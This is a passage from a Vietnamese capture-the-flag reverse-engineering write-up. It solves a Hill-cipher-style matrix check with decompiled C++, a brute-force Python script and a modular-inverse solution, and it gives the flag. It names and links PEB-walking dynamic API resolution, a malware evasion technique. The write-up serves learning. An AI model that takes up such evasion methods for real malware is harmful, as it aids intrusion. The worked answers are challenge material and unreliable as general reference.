Tại đây, nó thực hiện resolve `Kernel32.dll` từ đó dùng hàm `resolveAPI` tìm các địa chỉ hàm như `LoadLibraryA, GetProcAddress` và thực hiện chính xác kỹ thuật [**manual dynamic resolve window API**](https://deepwiki.com/Offensive-Panda/ProcessInjectionTechniques/4.2-peb-walking-and-dynamic-api-resolution) ([code](https://github.com/Offensive-Panda/ProcessInjectionTechniques/blob/a7456b63/PEB_WALK_INJECTION/readme.md#L84-L105)).

Tiếp theo load `Shell32.dll` để dùng hàm `CommandLineToArgvW`(để xử lý tham số đầu vào là flag).

Hàm `mul_matrix` thao tác lần lượt 3 byte flag nên dễ dàng brute force:
```cpp
__int64 mul_matrix(_BYTE *matrix, _BYTE *enc_matrix, int len_ct, int *key)
{
  int k; // [rsp+0h] [rbp-18h]
  int j; // [rsp+4h] [rbp-14h]
  int i; // [rsp+8h] [rbp-10h]
  int v8; // [rsp+Ch] [rbp-Ch]
  __int64 _matrix; // [rsp+20h] [rbp+8h]
  __int64 _enc_matrix; // [rsp+28h] [rbp+10h]
  __int64 *_key; // [rsp+38h] [rbp+20h]

  for ( i = 0; i < len_ct; i += 3 )
  {
    for ( j = 0; j < 3; ++j )
    {
      v8 = 0;
      for ( k = 0; k < 3; ++k )
        v8 += *(_matrix + k + i) * *(_key + 3 * j + k);
      *(_enc_matrix + j + i) = v8;
    }
  }
  return ret();
}
```

> brute.py

```python
from itertools import product

ct = [
    0xE9, 0xAF, 0x12, 0x2D, 0x6B, 0x44, 0x51, 0xEC, 
    0x49, 0x5B, 0xD1, 0x3E, 0x8F, 0xEA, 0x56, 0x1A, 
    0x94, 0x11, 0x12, 0xEC, 0xC2, 0xA4, 0xDA, 0x9D
]
key = [[6, 24, 1], [13, 16, 10], [20, 17, 15]]
chks = [ct[i:i+3] for i in range(0, len(ct), 3)]
chars = range(32, 127)
flag = ''
for i, chk in enumerate(chks):
    for p in product(chars, repeat=3):
        c = [0,0,0]
        for r in range(3):
            v = 0
            for k in range(3):
                v += key[r][k] * p[k]
            c[r] = v & 0xFF
        if c == chk:
            print(p)
            flag += bytes(p).decode()
            break
print(f"KCSC{{{flag}}}")
# KCSC{easy_obfuscate_0328db}
```


Ngoài ra có thể học thêm 1 ít toán để giải. Tại đây thực hiện nhân ma trận flag với key theo công thức tích vô hướng: $m[0] \times key[j][0] + m[1] \times key[j][1] + m[2] \times key[j][2]$.

với $m$ là vector đầu vào từ matrix có 3 phần tử: $P = [p_0, p_1, p_2]^T$


Viết lại công thức dưới dạng ma trận $C = K \times P$:

$$\begin{bmatrix} c_0 \\ c_1 \\ c_2 \end{bmatrix} = 
\begin{bmatrix} 
K_{00} & K_{01} & K_{02} \\ 
K_{10} & K_{11} & K_{12} \\ 
K_{20} & K_{21} & K_{22} 
\end{bmatrix} \times 
\begin{bmatrix} p_0 \\ p_1 \\ p_2 \end{bmatrix}$$

Giải toán $$P = K^{-1} \times C$$

tức là tạo ma trận nghịch đảo $K^{-1}$ từ key, lấy 3 byte ct dựng thành cột (Matrix 3x1) rồi nhân $K^{-1}$ với cột đó.

```python
from sympy import Matrix

ct = [
    0xE9, 0xAF, 0x12, 0x2D, 0x6B, 0x44, 0x51, 0xEC, 
    0x49, 0x5B, 0xD1, 0x3E, 0x8F, 0xEA, 0x56, 0x1A, 
    0x94, 0x11, 0x12, 0xEC, 0xC2, 0xA4, 0xDA, 0x9D
]
key = [6, 24, 1, 13, 16, 10, 20, 17, 15]
K_m = Matrix(3, 3, key)
print(K_m)
K_inv = K_m.inv_mod(256)
print(f"K^-1: {K_inv}")
flag = []
for i in range(0, len(ct), 3):
    c_ct = Matrix(3, 1, ct[i : i + 3])
    c_pt = K_inv * c_ct
    for j in range(3):
        flag.append(c_pt[j] % 256)
print(f"KCSC{{{bytes(flag).decode()}}}")
# KCSC{easy_obfuscate_0328db}
```
